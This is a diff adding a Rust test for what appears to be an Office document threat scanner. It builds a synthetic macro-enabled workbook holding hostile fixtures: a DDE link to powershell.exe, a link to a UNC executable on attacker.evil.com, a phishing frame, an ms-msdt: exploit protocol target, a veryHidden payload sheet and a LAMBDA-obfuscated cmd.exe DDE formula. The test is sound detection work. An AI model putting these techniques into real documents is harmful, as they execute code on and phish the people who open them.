@@ -3553,3 +3553,200 @@ fn e2e_customui_dialogsheet_contenttype_and_lambda_threat_inspection() {
         "JSON missing VBA-CELL-028"
     );
 }
+
+#[test]
+fn e2e_externallink_websettings_workbookprotection_and_lambda_helpers_inspection() {
+    let ext_link_xml = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
+  <ddeLink ddeService="powershell.exe" ddeTopic="-Enc aWV4..."/>
+  <oleLink progId="Excel.SheetMacroEnabled.12"/>
+</externalLink>"#;
+
+    let ext_link_rels = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/externalLinkPath" Target="\\attacker.evil.com\payload.exe" TargetMode="External"/>
+</Relationships>"#;
+
+    let websettings_xml = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<w:webSettings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
+  <w:frameset>
+    <w:frame>
+      <w:source w:val="http://phishing.evil.com/login.html"/>
+    </w:frame>
+  </w:frameset>
+  <w:reload/>
+</w:webSettings>"#;
+
+    let websettings_rels = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/frame" Target="ms-msdt:/id PCWDiagnostic /skip force" TargetMode="External"/>
+</Relationships>"#;
+
+    let workbook_xml = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
+  <sheets>
+    <sheet name="PayloadSheet" sheetId="1" state="veryHidden" r:id="rId1"/>
+    <sheet name="VisibleSheet" sheetId="2" r:id="rId2"/>
+  </sheets>
+  <workbookProtection lockStructure="1" lockWindows="1" workbookAlgorithmName="SHA-512" hashValue="0000000000000000" saltValue="AAAAAAAAAAAAAAAA"/>
+</workbook>"#;
+
+    let sheet_xml = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
+  <sheetData>
+    <row r="1">
+      <c r="A1">
+        <f>REDUCE(&quot;&quot;, {&quot;c&quot;, &quot;m&quot;, &quot;d&quot;, &quot;.exe|'/c calc'!A0&quot;}, LAMBDA(acc, v, acc &amp; v))</f>
+      </c>
+    </row>
+  </sheetData>
+</worksheet>"#;
+
+    let content_types = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
+  <Default Extension="xml" ContentType="application/xml"/>
+  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
+  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.ms-excel.sheet.macroEnabled.main+xml"/>
+  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
+  <Override PartName="/xl/externalLinks/externalLink1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.externalLink+xml"/>
+  <Override PartName="/word/webSettings.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.webSettings+xml"/>
+</Types>"#;
+
+    let root_rels = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
+</Relationships>"#;
+
+    let wb_rels = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
+  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/externalLink" Target="externalLinks/externalLink1.xml"/>
+  <Relationship Id="rId3" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/>
+</Relationships>"#;
+
+    let project_bytes = synthesize_cfb_project(
+        "VBAProject",
+        &[("Module1", "Sub AutoOpen()\nEnd Sub\n", &[])],
+        &[],
+    );
+
+    let entries: Vec<(&str, &[u8])> = vec![
+        ("[Content_Types].xml", content_types),
+        ("_rels/.rels", root_rels),
+        ("xl/_rels/workbook.xml.rels", wb_rels),
+        ("xl/workbook.xml", workbook_xml),
+        ("xl/worksheets/sheet1.xml", sheet_xml),
+        ("xl/externalLinks/externalLink1.xml", ext_link_xml),
+        (
+            "xl/externalLinks/_rels/externalLink1.xml.rels",
+            ext_link_rels,
+        ),
+        ("word/webSettings.xml", websettings_xml),
+        ("word/_rels/webSettings.xml.rels", websettings_rels),
+        ("xl/vbaProject.bin", &project_bytes),
+    ];
+
+    let zip_bytes = synthesize_zip(&entries);
+    let options = AnalysisOptions {
+        limits: Limits::default(),
+        host_profile: HostProfile::Excel,
+        ..Default::default()
+    };
+    let inspection = inspect_macro_file(&zip_bytes, &options).expect("Inspection should succeed");
+    let threats = &inspection.extracted.cell_threats;
+
+    // 1. Verify ExternalLinkTarget (VBA-CELL-029)
+    assert!(
+        threats.iter().any(|t| t.threat_kind == "ExternalLinkTarget"
+            && t.coordinate.contains("dde:powershell.exe")
+            && t.severity == "Critical"),
+        "Should detect externalLink DDE server execution: {threats:?}"
+    );
+    assert!(
+        threats.iter().any(|t| t.threat_kind == "ExternalLinkTarget"
+            && t.coordinate.contains("ole:Excel.SheetMacroEnabled.12")
+            && t.severity == "High"),
+        "Should detect externalLink OLE link: {threats:?}"
+    );
+    assert!(
+        threats.iter().any(|t| t.threat_kind == "ExternalLinkTarget"
+            && t.formula.contains("\\\\attacker.evil.com\\payload.exe")
+            && t.severity == "Critical"),
+        "Should detect externalLink relationship targeting remote UNC executable: {threats:?}"
+    );
+
+    // 2. Verify WebSettingsScriptOrReload (VBA-CELL-030)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "WebSettingsScriptOrReload"
+                && t.coordinate
+                    .contains("frame:http://phishing.evil.com/login.html")
+                && t.severity == "High"),
+        "Should detect webSettings remote frame source: {threats:?}"
+    );
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "WebSettingsScriptOrReload"
+                && t.coordinate.contains("reload:directive")
+                && t.severity == "High"),
+        "Should detect webSettings reload directive: {threats:?}"
+    );
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "WebSettingsScriptOrReload"
+                && t.formula.contains("ms-msdt:")
+                && t.severity == "Critical"),
+        "Should detect webSettings relationship targeting exploit protocol: {threats:?}"
+    );
+
+    // 3. Verify WorkbookProtectionEvasion (VBA-CELL-031)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "WorkbookProtectionEvasion"
+                && t.coordinate.contains("evasion:veryHidden:PayloadSheet")
+                && t.severity == "High"),
+        "Should detect workbook protection structure lock cloaking veryHidden sheet: {threats:?}"
+    );
+
+    // 4. Verify Lambda helper de-obfuscation resolves cell A1 to DDE
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "A1"
+            && t.threat_kind == "DDE"
+            && t.description.contains("cmd.exe|'/c calc'!A0")),
+        "Cell A1 should resolve DDE through REDUCE Lambda evaluation: {threats:?}"
+    );
+
+    // 5. Verify SARIF contains rules VBA-CELL-029, VBA-CELL-030, VBA-CELL-031
+    let sarif = inspection_to_sarif(&inspection, "file:///test/advanced_container.xlsm");
+    assert!(
+        sarif.contains("VBA-CELL-029"),
+        "SARIF must contain VBA-CELL-029 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-030"),
+        "SARIF must contain VBA-CELL-030 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-031"),
+        "SARIF must contain VBA-CELL-031 rule"
+    );
+
+    // 6. Verify JSON contains rule_id VBA-CELL-029, VBA-CELL-030, VBA-CELL-031
+    let json = inspect_to_json(&inspection, Disclosure::IncludeSource);
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-029\""),
+        "JSON missing VBA-CELL-029"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-030\""),
+        "JSON missing VBA-CELL-030"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-031\""),
+        "JSON missing VBA-CELL-031"
+    );
+}
